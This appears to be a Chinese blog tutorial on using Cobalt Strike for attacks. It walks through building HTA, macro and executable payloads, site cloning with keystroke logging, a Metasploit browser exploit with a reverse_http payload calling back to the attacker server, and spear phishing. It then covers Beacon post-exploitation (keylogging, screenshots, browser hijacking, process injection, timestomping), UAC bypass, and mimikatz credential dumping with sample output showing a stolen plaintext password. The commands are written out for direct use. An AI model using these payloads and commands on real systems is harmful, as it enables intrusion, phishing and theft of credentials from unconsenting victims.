+<h3 id="CS攻击方式"><a href="#CS攻击方式" class="headerlink" title="CS攻击方式"></a>CS攻击方式</h3><p><strong>用户驱动攻击</strong><br>用户驱动攻击User-Driven Attacks需要欺骗用户产生交互才行，但也有许多的优点。<br>首先用户驱动攻击不包含恶意攻击代码，所以用户系统上的安全补丁是没用的；其次无论目标使用什么版本的程序，我们都可以创建相应的功能来执行；最后因为用户驱动攻击十分可靠，也使得它很完美。</p>
+<p>当我们采取行动来追踪并需要攻击时，它就像用户本地执行程序一样，CS为我们提供了几个用户驱动攻击的选项，分别如下：</p>
+<p><strong>用户驱动攻击包</strong><br>用户驱动攻击包User-Driven Attacks Packages功能打开位置：Attacks –&gt; Packages</p>
+<ol>
+<li>HTML应用<br>HTML应用HTML Application生成(executable&#x2F;VBA&#x2F;powershell)这3种原理不同的VBScript实现的evil.hta文件。</li>
+<li>Microsoft Office 宏文件<br>Microsoft Office 宏文件Microsoft Office Document Macros可以生成恶意宏放入office文件，非常经典的攻击手法。</li>
+<li>Payload 生成器<br>Payload生成器Payload Generator可以生成各种语言版本的Payload，便于进行免杀。</li>
+<li>Windows 可执行文件<br>Windows 可执行文件Windows Executable 会生成一个Windows可执行文件或DLL文件。默认x86，勾选x64表示包含x64 payload stage生成了artifactX64.exe(17kb) artifactX64.dll(17kb)</li>
+<li>Windows 可执行文件（Stageless）<br>Windows 可执行文件（Stageless）Windows Executable (Stageless)会生成一个无进程的Windows可执行文件或DLL文件。其中的 Stageless 表示把包含payload在内的”全功能”被控端都放入生成的可执行文件beconX64.exe(313kb) beconX64.dll(313kb) becon.ps1(351kb)</li>
+</ol>
+<p><strong>用户驱动的Web交付攻击</strong><br>用户驱动Web交付攻击User-Driven Web Drive-by Attacks功能打开位置：Attacks –&gt; Web Drive-by</p>
+<ol>
+<li>java 签名 applet 攻击<br>java 签名 applet 攻击Java Signed Applet Attack会启动一个Web服务以提供自签名Java Applet的运行环境，浏览器会要求用户授予applet运行权限，如果用户同意则实现控制，但目前该攻击方法已过时。</li>
+<li>Java 智能 Applet 攻击<br>Java 智能 Applet 攻击Java Smart Applet Attack会自动检测Java版本并利用已知的漏洞绕过安全沙箱，但CS官方称该攻击的实现已过时，在现在的环境中无效。</li>
+<li>脚本化 Web 交付<br>脚本化 Web 交付Scripted Web Delivery 为payload提供web服务以便于下载和执行，类似于MSF的Script Web Delivery</li>
+<li>托管文件<br>托管文件Host File通过Attacks –&gt; Web Drive-by –&gt; Host File进行配置，攻击者可以通过这个功能将文件上传到CS服务端上，从而进行文件托管。<br>如果想删除上传到CS服务端上的文件，可以到Attacks –&gt; Web Drive-by –&gt; Manage下进行删除。<br>如果想查看谁访问了这些文件，可以到View –&gt; Web Log下进行查看。</li>
+</ol>
+<h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><h4 id="HTML-应用攻击"><a href="#HTML-应用攻击" class="headerlink" title="HTML 应用攻击"></a>HTML 应用攻击</h4><p>首先来到Attacks –&gt; Packages –&gt; HTML Application创建一个HTML应用，如果没有创建监听的话，还需要创建一个监听。</p>
+<p><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/34.png"></p>
+<p>HTML应用文件生成好后，来到Attacks –&gt; Web Drive-by –&gt; Host File，选择刚才生成的文件，最后点击Launch，复制CS创建的链接，在目标主机上打开此链接。<br><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/35.png"></p>
+<p>当在目标主机上提示是否运行时，点击运行。</p>
+<p><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/36.png"></p>
+<p>当该文件在目标上运行后，CS客户端上就可以看到回连的会话了。</p>
+<p><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/37.png"></p>
+<h4 id="MSF-与-CS-的结合利用"><a href="#MSF-与-CS-的结合利用" class="headerlink" title="MSF 与 CS 的结合利用"></a>MSF 与 CS 的结合利用</h4><p>如果想使用MSF对目标进行漏洞利用，再通过这个漏洞来传输Beacon的话，也是可以的。</p>
+<ol>
+<li>首先在MSF上选择攻击模块</li>
+<li>接着在MSF上设置Payload为windows&#x2F;meterpreter&#x2F;reverse_http或者windows&#x2F;meterpreter&#x2F;reverse_https，这么做是因为CS的Beacon与MSF的分阶段协议是相兼容的。</li>
+<li>之后在MSF中设置Payload的LHOST、LPORT为CS中Beacon的监听器IP及端口。</li>
+<li>然后设置 DisablePayloadHandler 为 True，此选项会让 MSF 避免在其内起一个 handler 来服务你的 payload 连接，也就是告诉MSF说我们已经建立了监听器，不必再新建监听器了。</li>
+<li>再设置 PrependMigrate 为 True，此选项让 MSF 前置 shellcode 在另一个进程中运行 payload stager。如果被利用的应用程序崩溃或被用户关闭，这会帮助 Beacon 会话存活。</li>
+<li>最后运行exploit -j，-j 是指作为job开始运行，即在后台运行。</li>
+</ol>
+<p><strong>操作</strong></p>
+<p>在CS中新建一个HTTP Beacon，创建过程不再赘述。</p>
+<ol>
+<li>在MSF中选择攻击模块，根据教程这里选择的adobe_flash_hacking_team_uaf模块，不过个人感觉现在这个模块已经不太能被利用成功了。<br>use exploit&#x2F;multi&#x2F;browser&#x2F;adobe_flash_hacking_team_uaf</li>
+<li>接着配置payload，这里选择revese_http payload<br>set payload windows&#x2F;meterpreter&#x2F;revese_http<br>set LHOST cs_server_ip<br>set LPORT 80</li>
+<li>之后，配置DisablePayloadHandler、PrependMigrate为 True<br>set DisablePayloadHandler True<br>set PrependMigrate True</li>
+<li>最后，开始攻击。<br>exploit -j</li>
+</ol>
+<p><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/38.png"></p>
+<h4 id="伪装—克隆网站"><a href="#伪装—克隆网站" class="headerlink" title="伪装—克隆网站"></a>伪装—克隆网站</h4><p>在向目标发送漏洞程序之前，我们将自己进行伪装一下，这样可以更好的保护自己，同时提高成功率。CS上有个克隆网站的功能，能够较好的帮助到我们。<br>首先，来到Attacks –&gt; Web Drive-by –&gt; Clone Site下，打开克隆网站的功能，之后写入待克隆网站的URL，在Attack中写入MSF中生成的URL。<br>其中Log keystrokes on cloned site选项如果勾选则可以获取目标的键盘记录，记录结果在Web Log中能够查看。<br><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/39.png"><br>之后，浏览器打开克隆站点地址，如果目标存在漏洞，就可以被利用了，同时在CS中也会观察到主机上线。</p>
+<h4 id="鱼叉式网络钓鱼"><a href="#鱼叉式网络钓鱼" class="headerlink" title="鱼叉式网络钓鱼"></a>鱼叉式网络钓鱼</h4><p><strong>用CS进行钓鱼需要四个步骤：</strong></p>
+<ol>
+<li>创建一个目标清单</li>
+<li>制作一个邮件模板或者使用之前制作好的模板</li>
+<li>选择一个用来发送邮件的邮件服务器</li>
+<li>发送邮件</li>
+</ol>
+<p><strong>目标清单</strong><br>目标清单就是每行一个邮件地址的txt文件，即每行包含一个目标。<br>在一行中除了邮件地址也可以使用标签或一个名字。如果提供了名称，则有助于 Cobalt Strike 自定义每个网络钓鱼。<br>这里使用一些在线邮件接收平台的邮箱地址作为示例。</p>
+<blockquote>
+<p><a href="mailto:&#x61;&#115;&#x74;&#114;&#113;&#x62;&#55;&#x39;&#x35;&#x30;&#49;&#64;&#99;&#x68;&#x61;&#x63;&#117;&#111;&#x2e;&#x6e;&#101;&#x74;">&#x61;&#115;&#x74;&#114;&#113;&#x62;&#55;&#x39;&#x35;&#x30;&#49;&#64;&#99;&#x68;&#x61;&#x63;&#117;&#111;&#x2e;&#x6e;&#101;&#x74;</a> test1<br><a href="mailto:&#x67;&#115;&#x77;&#116;&#100;&#109;&#50;&#x36;&#49;&#x38;&#48;&#x40;&#x63;&#x68;&#97;&#x63;&#x75;&#111;&#x2e;&#110;&#101;&#116;">&#x67;&#115;&#x77;&#116;&#100;&#109;&#50;&#x36;&#49;&#x38;&#48;&#x40;&#x63;&#x68;&#97;&#x63;&#x75;&#111;&#x2e;&#110;&#101;&#116;</a> test2<br><a href="mailto:&#x79;&#x70;&#x6d;&#x67;&#x69;&#110;&#x39;&#53;&#52;&#x31;&#x36;&#64;&#99;&#x68;&#x61;&#x63;&#117;&#x6f;&#46;&#110;&#x65;&#x74;">&#x79;&#x70;&#x6d;&#x67;&#x69;&#110;&#x39;&#53;&#52;&#x31;&#x36;&#64;&#99;&#x68;&#x61;&#x63;&#117;&#x6f;&#46;&#110;&#x65;&#x74;</a> test3</p>
+</blockquote>
+<p>将以上内容保存为txt文本文件，就创建好了自己的目标清单。</p>
+<p><strong>模板</strong><br>使用模板的好处在于可以重复利用，制作钓鱼模板也很简单。<br>首先可以自己写一封邮件发给自己，或者直接从自己收件箱挑选一个合适的。有了合适的邮件之后，查看邮件原始信息，一般在邮件的选项里能找到这个功能。最后将邮件的原始信息保存为文件，一个模板就制作完成了。</p>
+<p><strong>发送邮件</strong><br>有了目标和模板，然后选好自己的邮件服务器，之后就可以发送消息了。<br>在CS客户端中，点击Attacks –&gt; Spear Phish即可打开网络钓鱼模块。添加上目标、模板、钓鱼地址、邮箱服务、退回邮箱，其中Bounce To为退回邮件接收地址，注意要和配置邮件服务器时填的邮箱一致，否则会报错。<br><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/40.png"></p>
+<p>所有信息添加完成后，可以点击Preview查看。如果感觉效果不错，就可以点击send发送了。<br>当目标收到钓鱼邮件，并且点击钓鱼邮件中的链接后，如果钓鱼链接配置的没有问题，CS就能够上线了。<br><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/41.png"></p>
+<p>在真实环境中的钓鱼邮件也不会像这里这么浮夸，真实环境中的钓鱼邮件往往都伪装成和正经儿的邮件一模一样，单从表面上看很难看出区别，因此提高自己的安全意识还是很重要滴。<br><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/42.png"></p>
+<h2 id="0x03-后渗透"><a href="#0x03-后渗透" class="headerlink" title="0x03 后渗透"></a>0x03 后渗透</h2><h3 id="Beacon-的管理"><a href="#Beacon-的管理" class="headerlink" title="Beacon 的管理"></a>Beacon 的管理</h3><p><strong>Beacon 控制台</strong><br>在一个 Beacon 会话上右击 interact（交互）即可打开 Beacon 控制台，如果想对多个会话进行控制，也只需选中多个会话，执行相关功能即可。<br><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/43.png"></p>
+<p>在 Beacon 的控制台中的输入与输出之间，是一个状态栏，状态栏上的信息分别是：目标 NetBIOS 名称、用户名、会话PID以及 Beacon 最近一次连接到 CS 团队服务器的时间。<br>Beacon 控制台是在使用 CS 的过程中，很经常用到的功能，向 Beacon 发出的每个命令，都可以在这里看到，如果队友发送了消息，在 Beacon 控制台同样能看到，消息前还会显示队友的名称。</p>
+<p><strong>Beacon 菜单</strong></p>
+<ul>
+<li>Access：包含了一些对凭据的操作及提权的选项</li>
+<li>Explore：包含了信息探测与目标交互的选项</li>
+<li>Pivoting：包含了一些设置代理隧道的选项</li>
+<li>Session：包含了对当前 Beacon 会话管理的选项</li>
+<li>Beacon 命令</li>
+<li>help：查看 Beacon 命令的帮助信息。使用 help + 待查看帮助的命令可查看该命令的帮助信息。</li>
+<li>clear：清除 Beacon 命令队列。Beacon 是一个异步的 Payload，输入的命令并不会立即执行，而是当 Beacon 连接到团队服务器时再一一执行命令，因此当需要清除队列命令时就可以使用 * clear 命令。</li>
+<li>sleep：改变 Beacon 的休眠时间。输入 sleep 30表示休眠30秒；输入sleep 60 50表示，随机睡眠 30秒至60秒，其中30秒 &#x3D; 60 x 50%；如果输入 sleep 0则表示进入交互模式，任何输入的命令都会被立即执行，当输入一些命令，比如desktop时， Beacon 会自动进入交互模式。</li>
+<li>shell：通过受害主机的 cmd.exe 执行命令。比如运行ipconfig，就需要输入shell ipconfig</li>
+<li>run：不使用 cmd.exe 执行命令。该命令也是 run + 命令的形式运行，该命令会将执行结果回显。</li>
+<li>execute：执行命令，但不回显结果。</li>
+<li>cd：切换当前工作目录。</li>
+<li>pwd：查看当前所在目录。</li>
+<li>powershell：通过受害主机的 PowerShell 执行命令。比如想在 PowerShell 下运行 ipconfig，就需要输入powershell ipconfig</li>
+<li>powerpick：不使用 powershell.exe 执行 powershell 命令。这个命令依赖于由 Lee Christensen 开发的非托管 PowerShell 技术。powershell 和 powerpick 命令会使用当前令牌（ token ）。</li>
+<li>psinject：将非托管的 PowerShell 注入到一个特定的进程中并从此位置运行命令。</li>
+<li>powershell-import：导入 PowerShell 脚本到 Beacon 中。直接运行 powershell-import + 脚本文件路径即可，但是这个脚本导入命令一次仅能保留一个 PowerShell 脚本，再导入一个新脚本的时候，上一个脚本就被覆盖了，因此可以通过导入一个空文件来清空 Beacon 中导入的脚本。</li>
+<li>powershell get-help：获取 PowerShell 命令的相关帮助信息。比如想获取 PowerShell 下 get-process 命令的帮助，就需要输入powershell get-help get-process</li>
+<li>execute-assembly：将一个本地的 .NET 可执行文件作为 Beacon 的后渗透任务来运行。</li>
+<li>setenv：设置一个环境变量。</li>
+</ul>
+<h3 id="会话传递"><a href="#会话传递" class="headerlink" title="会话传递"></a>会话传递</h3><p><strong>会话传递相关命令</strong></p>
+<ul>
+<li>Beacon 被设计的最初目的就是向其他的 CS 监听器传递会话。</li>
+<li>spawn：进行会话的传递，也可直接右击会话选择spawn命令进行会话的选择。默认情况下，spawn命令会在 rundll32.exe 中派生一个会话。为了更好的隐蔽性，可以找到更合适的程序（如 Internet Explorer） 并使用spawnto命令来说明在派生新会话时候会使用 Beacon 中的哪个程序。</li>
+<li>spawnto：该命令会要求指明架构（x86 还是 x64）和用于派生会话的程序的完整路径。单独输入spawnto命令然后按 enter 会指示 Beacon 恢复至其默认行为。</li>
+<li>inject：输入inject + 进程 id + 监听器名来把一个会话注入一个特定的进程中。使用 ps 命令来获取一个当前系统上的进程列表。使用inject [pid] x64来将一个64位 Beacon 注入到一个 64位进程中。</li>
+<li>spawn和inject命令都将一个 payload stage 注入进内存中。如果 payload stage 是 HTTP、HTTPS 或 DNS Beacon 并且它无法连接到你，那么将看不到一个会话。如果 payload stage 是一个绑定的 TCP 或 SMB 的 Beacon，这些命令会自动地尝试连接到并控制这些 payload。</li>
+<li>dllinject：dllinject + [pid]来将一个反射性 DLL 注入到一个进程中。</li>
+<li>shinject：使用shinject [pid] [架构] [&#x2F;路径&#x2F;…&#x2F;file.bin]命令来从一个本地文件中注入 shellcode 到一个目标上的进程中。</li>
+<li>shspawn：使用shspawn [架构] [&#x2F;路径&#x2F;…&#x2F;file.bin]命令会先派生一个新进程（这个新进程是 spawn to 命令指定的可执行文件），然后把指定的 shellcode 文件（ file.bin ）注入到这个进程中。</li>
+<li>dllload：使用dllload [pid] [c:\路径…\file.dll]来在另一个进程中加载磁盘上的 DLL文件。</li>
+</ul>
+<p><strong>会话传递使用场景</strong></p>
+<ol>
+<li>将当前会话传递至其他CS团队服务器中，直接右击spawn选择要传递的监听器即可。</li>
+<li>将当前会话传递至MSF中，这里简单做一下演示。</li>
+</ol>
+<blockquote>
+<p>首先，在MSF中，为攻击载荷新建一个payload<br>msf5 &gt; use exploit&#x2F;multi&#x2F;handler<br>msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_https<br>msf5 exploit(multi&#x2F;handler) &gt; set lhost 192.168.175.156<br>msf5 exploit(multi&#x2F;handler) &gt; set lport 443<br>msf5 exploit(multi&#x2F;handler) &gt; exploit -j</p>
+</blockquote>
+<p>随后，在CS中新建一个外部Foreign监听器，这里设置的监听IP与端口和MSF中的一致即可，随后在CS中利用spawn选择刚新建的外部监听器，MSF中即可返回会话。</p>
+<h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><p>浏览会话系统文件位置在右击会话处，选择 Explore –&gt; File Browser即可打开。在这里可以对当前会话下的文件进行浏览、上传、下载、删除等操作。<br>在进行文件浏览时，如果 beacon 设置的 sleep 值较高，CS会因此而变得响应比较慢。<br>彩色文件夹表示该文件夹的内容位于此文件浏览器的缓存中；深灰色的文件夹表示该文件夹的内容不在此文件浏览器缓存中。</p>
+<p><strong>文件下载</strong></p>
+<ul>
+<li>download：下载请求的文件。Beacon 会下载它的任务要求获取的每一个文件的固定大小的块。这个块的大小取决于 Beacon 当前的数据通道。HTTP 和 HTTPS 通道会拉取 512kb 的数据块。</li>
+<li>downloads：查看当前 Beacon 正在进行的文件下载列表。</li>
+<li>cancel：该命令加上一个文件名来取消正在进行的一个下载任务。也可以在 cancel 命令中使用通配符来一次取消多个文件下载任务。</li>
+</ul>
+<p>下载文件都将下载到CS团队服务器中，在View –&gt; Download下可看到下载文件的记录，选中文件后使用Sync Files即可将文件下载到本地。</p>
+<p><strong>文件上传</strong></p>
+<ul>
+<li>upload：上传一个文件到目标主机上。</li>
+<li>timestomp：将一个文件的修改属性访问属性和创建时间数据与另一个文件相匹配。当上传一个文件时，有时会想改变此文件的时间戳来使其混入同一文件夹下的其他文件中，使用timestomp 命令就可以完成此工作。</li>
+</ul>
+<h3 id="用户驱动溢出攻击"><a href="#用户驱动溢出攻击" class="headerlink" title="用户驱动溢出攻击"></a>用户驱动溢出攻击</h3><p>Beacon 运行任务的方式是以jobs去运行的，比如键盘记录、PowerShell 脚本、端口扫描等，这些任务都是在 beacon check in 之间于后台运行的。</p>
+<ul>
+<li>jobs：查看当前 Beacon 中的任务</li>
+<li>jobkill：加上任务 ID，对指定任务进行停止</li>
+</ul>
+<p><strong>屏幕截图</strong></p>
+<ul>
+<li><p>screenshot：获取屏幕截图，使用screenshot pid来将截屏工具注入到一个 x86 的进程中，使用screenshot pid x64注入到一个 x64 进程中，explorer.exe 是一个好的候选程序。<br>使用screenshot [pid] [x86|x64] [time]来请求截屏工具运行指定的秒数，并在每一次 Beacon 连接到团队服务器的时候报告一张屏幕截图，这是查看用户桌面的一种简便方法。要查看截屏的具体信息，通过View –&gt; Screenshots来浏览从所有 Beacon 会话中获取的截屏。<br>键盘记录</p>
+</li>
+<li><p>keylogger：键盘记录器，使用keylogger pid来注入一个 x86 程序。使用keylogger pid x64来注入一个 x64 程序，explorer.exe 是一个好的候选程序。<br>使用单独的 keylogger 命令来将键盘记录器注入一个临时程序。键盘记录器会监视从被注入的程序中的键盘记录并将结果报告给 Beacon，直到程序终止或者自己杀死了这个键盘记录后渗透任务。要查看键盘记录的结果，可以到View –&gt; Keystrokes中进行查看。</p>
+</li>
+</ul>
+<p><strong>其他</strong><br>除了上述使用命令的方式进行屏幕截图和键盘记录，也可以来到Explore –&gt; Process List下选择要注入的进程，再直接点击屏幕截图或键盘记录的功能按钮。<br>从使用上，具体注入那个程序都是可以的，只是注入 explorer.exe 会比较稳定与持久。值得注意的是，多个键盘记录器可能相互冲突，每个桌面会话只应使用一个键盘记录器。</p>
+<p><strong>浏览器转发</strong><br>浏览器转发是指在已经攻击成功的目标中，利用目标的信息登录网站进行会话劫持，但是目前只支持目标正在使用IE浏览器的前提下。关于如何判断当前用户是否使用IE浏览器，则可以通过屏幕截图来判断。如下图中，通过屏幕截图可以看到目标正在使用IE浏览器登陆着当前网站的admin账户。<br><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/44.png"></p>
+<p>找到目前正在使用IE浏览器的目标后，右击该会话，选择Explore –&gt; Browser Pivot，随后选择要注入的进程，CS 会在它认为可以注入的进程右边显示一个对勾，设置好端口后，点击运行即可。<br>此时，在浏览器中配置代理，代理配置为http代理，IP为CS团队服务器IP，端口为刚设置的端口。<br>代理配置好后，在浏览器中打开目标当前正在打开的网址，即可绕过登录界面。</p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>portscan：进行端口扫描，使用参数为：portscan [targets] [ports] [discovery method]。<br>目标发现discovery method有三种方法，分别是：arp、icmp、none，arp方法使用 ARP 请求来发现一个主机是否存活。icmp方法发送一个 ICMP echo 请求来检查一个目标是否存活。none选项让端口扫描工具假设所有的主机都是存活的。<br>端口扫描会在 Beacon 和团队服务器通讯的这个过程中不停运行。当它有可以报告的结果，它会把结果发送到 Beacon 控制台。Cobalt Strike 会处理这个信息并使用发现的主机更新目标模型。<br>右击 Beacon会话，在Explore –&gt; Port Scan中即可打开端口扫描的图形窗口，CS会自动填充扫描地址，确认扫描地址、端口、扫描方式等无误后，开始扫描即可。扫描结束后，在 target table页面中可看到扫描结果，右击会话，选择 Services 可查看详细的扫描结果。</p>
+<p><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/45.png"></p>
+<h2 id="0x04-提权"><a href="#0x04-提权" class="headerlink" title="0x04 提权"></a>0x04 提权</h2><h3 id="用户账户控制"><a href="#用户账户控制" class="headerlink" title="用户账户控制"></a>用户账户控制</h3><p>自 Windows vista 开始，Windows 系统引进了用户账户控制机制，即 UAC—User Account Control机制，UAC 机制在 Win 7中得到了完善。UAC 与 UNIX 中的 sudo 工作机制十分相似，平时用户以普通权限工作，当用户需要执行特权操作时，系统会询问他们是否要提升权限。<br>此时系统用户可分为以下三种等级：</p>
+<ul>
+<li>高：管理员权限</li>
+<li>中：一般用户权限</li>
+<li>低：受限制的权限</li>
+</ul>
+<h3 id="提权操作"><a href="#提权操作" class="headerlink" title="提权操作"></a>提权操作</h3><p>bypassuac：将本地中级管理员权限提升至本地高级管理员权限，适用于Win 7 及以上的系统。<br>Bypass UAC 有两个步骤，分别是：</p>
+<ol>
+<li>利用 UAC 漏洞来获取一个特权文件副本</li>
+<li>使用 DLL 劫持进行代码执行<br>首先使用shell whoami &#x2F;groups查看当前上线主机用户的所属组及 UAC 等级<br><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/46.png"></li>
+</ol>
+<p>通过返回信息可以看出，当前用户为管理员权限，UAC 等级为中，根据上一节中关于的介绍，此时可以使用bypassuac进行提权。<br>首先，右击会话，选择Access –&gt; Elevate，这里选择一个 SMB Beacon，Exploit 选择uac-token-duplication，最后 Launch 即可。<br><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/47.png"></p>
+<p>待 Beacon Check in 后，当前用户 UAC 为高权限的会话便会上线了。<br><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/48.png"></p>
+<ul>
+<li>elevate：将任意用户的权限提升至系统权限，适用于2018年11月更新之前的 Win 7 和 Win 10 系统。</li>
+<li>getsystem：将本地高级管理员权限提升至系统权限。</li>
+<li>runas：使用其他用户的凭证来以其他用户身份运行一个命令，该命令不会返回任何输出。</li>
+<li>spawnas：使用其他用户的凭证来以其他用户身份派生一个会话，这个命令派生一个临时的进程并将 payload stage 注入进那个进程。</li>
+</ul>
+<p>首先，右击待提权的会话，选择Access –&gt; Spawn As，输入目标系统用户身份信息，其中域信息填写一个“点”代表本地用户，监听器这里选择的 SMB 监听器，之后点击运行就能看到对应的用户上线了。</p>
+<p><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/49.png"></p>
+<p><strong>PowerUp</strong></p>
+<p>可参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/l1028386804/article/details/86089574">https://blog.csdn.net/l1028386804/article/details/86089574</a></p>
+<h3 id="凭证和哈希获取"><a href="#凭证和哈希获取" class="headerlink" title="凭证和哈希获取"></a>凭证和哈希获取</h3><p>想要获取凭证信息，可以在管理员权限的会话处右击选择Access –&gt; Dump Hashes，或者在控制台中使用hashdump命令。<br><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/50.png"></p>
+<p>想获取当前用户的密码，可以运行mimikatz，右击管理员权限会话选择Access –&gt; Run Mimikatz，或在控制台运行logonpasswords命令。<br><img src="/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/51.png"></p>
+<p>在View –&gt; Credentials下可以查看到hashdump与mimikatz获取的数据。</p>
+<h4 id="Beacon-中的-Mimikatz"><a href="#Beacon-中的-Mimikatz" class="headerlink" title="Beacon 中的 Mimikatz"></a>Beacon 中的 Mimikatz</h4><p>在 Beacon 中集成了 mimikatz ，mimikatz 执行命令有三种形式：</p>
+<ul>
+<li>mimikatz [module::command]<br>运行 mimikatz 命令</li>
+<li>mimikatz [!module::command]<br>强制提升到 SYSTEM 权限再运行命令，因为一些命令只有在 SYSTEM 身份下才能被运行。</li>
+<li>mimikatz [@module::command]<br>使用当前 Beacon 的访问令牌运行 mimikatz 命令</li>
+</ul>
+<p>下面是一些mimikatz命令。</p>
+<ul>
+<li>!lsadump::cache<br>获取缓存凭证，默认情况下 Windows 会缓存最近10个密码哈希</li>
+<li>!lsadump::sam<br>获取本地账户密码哈希，该命令与 hashdump 比较类似</li>
+<li>misc::cmd<br>如果注册表中禁用了 CMD ，就重新启用它</li>
+<li>!misc::memssp<br>注入恶意的 Windows SSP 来记录本地身份验证凭据，这个凭证存储在“C:\windows\system32\mimilsa.log”中</li>
+<li>misc::skeleton<br>该命令仅限域内使用。该命令会给所有域内用户添加一个相同的密码，域内所有的用户都可以使用这个密码进行认证，同时原始密码也可以使用,其原理是对 lsass.exe 进行注入，重启后会失效。</li>
+<li>process::suspend [pid]<br>挂起某个进程，但是不结束它</li>
+<li>process::resume [pid]<br>恢复挂起的进程</li>
+</ul>
+<p>以上的这些只是mimikatz能做事情的一小部分，下面看看!misc::memssp的使用。<br>首先运行mimikatz !misc::memssp</p>
+<pre class="line-numbers language-none"><code class="language-none">beacon&gt; mimikatz !misc::memssp
+[*] Tasked beacon to run mimikatz’s !misc::memssp command
+[+] host called home, sent: 1006151 bytes
+[+] received output:
+Injected &#x3D;)
+
+接下来来到C:\Windows\system32目录
+beacon&gt; cd C:\Windows\system32
+[*] cd C:\Windows\system32
+[+] host called home, sent: 27 bytes
+
+beacon&gt; shell dir mimilsa.log
+[*] Tasked beacon to run: dir mimilsa.log
+[+] host called home, sent: 46 bytes
+[+] received output:
+驱动器 C 中的卷没有标签
+卷的序列号是 BE29-9C84
+C:\Windows\system32 的目录
+2020&#x2F;07&#x2F;23 21:47 24 mimilsa.log
+1 个文件 24 字节
+0 个目录 17,394,728,960 可用字节<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看到是存在mimilsa.log文件的，此时待目标主机重新登录，比如电脑锁屏后用户进行登录。<br>查看mimilsa.log文件内容</p>
+<pre class="line-numbers language-none"><code class="language-none">beacon&gt; shell type mimilsa.log
+[*] Tasked beacon to run: type mimilsa.log
+[+] host called home, sent: 47 bytes
+[+] received output:
+[00000000:000003e5] \
+[00000000:002b99a7] WIN-75F8PRJM4TP\Administrator Password123!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="0x05-CobaltStrike常用命令"><a href="#0x05-CobaltStrike常用命令" class="headerlink" title="0x05 CobaltStrike常用命令"></a>0x05 CobaltStrike常用命令</h2><pre class="line-numbers language-none"><code class="language-none">Beacon Commands
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+
+    Command                   Description
+    -------                   -----------
+    argue                     进程参数污染，利用虚假参数(通常很多)执行敏感操作绕过AV
+    blockdlls                 限定子进程只能加载带有Microsoft签名的dll，使AV无法通过dll加载对恶意程序进行监控
+    browserpivot              注入靶机IE浏览器进程并开启HTTP代理，攻击者可以通过此代理继承靶机IE已获取的凭证
+    cancel                    取消正在进行的下载
+    cd                        改变目录
+    checkin                   使用DNS Beacon时，使靶机强制回连C2
+    chromedump                从Chrome浏览器目录文件获取账户密码
+    clear                     清除Beacon内的任务队列
+    connect                   从当前Beacon连接到一个等待连接的TCP Beacon
+    covertvpn                 部署隐蔽VPN
+    cp                        复制文件
+    dcsync                    从域控制器中提取账户哈希
+    desktop                   查看并与靶机桌面交互
+    dllinject                 将反射型DLL注入进程
+    dllload                   使用LoadLibrary()将DLL加载到进程
+    download                  下载文件
+    downloads                 列出下载下载的文件
+    drives                    列出目标盘符
+    elevate                   生成提权环境的会话
+    execute                   在靶机执行命令（无输出）
+    execute-assembly          在靶机内存中执行本地.NET程序
+    exit                      结束当前Beacon会话
+    getprivs                  在当前凭证基础上提权
+    getsystem                 获取SYSTEM权限
+    getuid                    获取当前用户身份
+    hashdump                  导出账户哈希
+    help                      帮助文档，&quot;help+命令&quot;查看命令的使用方法
+    inject                    在特定进程生成会话
+    inline-execute            在当前会话中运行BOF（使用Beacon Api开发的文件）
+    jobkill                   结束CS长时间运行的后开发作业进程
+    jobs                      列出CS所有长时间运行的后开发作业(post-exploitation)，这些作业由CS执行恶意功能时临时创建
+    jump                      与远程主机新建连接生成新的会话
+    kerberos_ccache_use       从ccache文件中导入kerberos票据应用于当前会话
+    kerberos_ticket_purge     从当前会话中清除kerberos票据
+    kerberos_ticket_use       从ticket文件中导入kerberos票据应用于当前会话
+    keylogger                 开启键盘记录，可以将其注入指定的进程
+    kill                      结束进程
+    link                      从当前Beacon连接到一个等待连接的SMB Beacon
+    logonpasswords            利用mimikatz获取账户密码和哈希
+    ls                        显示当前目录文件
+    make_token                生成指定域用户的令牌，用于传递凭证，身份冒充
+    mimikatz                  运行mimikatz命令
+    mkdir                     新建目录
+    mode dns                  使用DNS A作为数据信道(仅限DNS Beacon)
+    mode dns-txt              使用DNS TXT作为数据信道(仅限DNS Beacon)
+    mode dns6                 使用DNS AAAA作为数据信道(仅限DNS Beacon)
+    mv                        移动文件
+    net                       net命令，如net view、net user等
+    note                      为当前Beacon做备注    
+    portscan                  扫描端口
+    powerpick                 通过unmanaged powershell执行命令
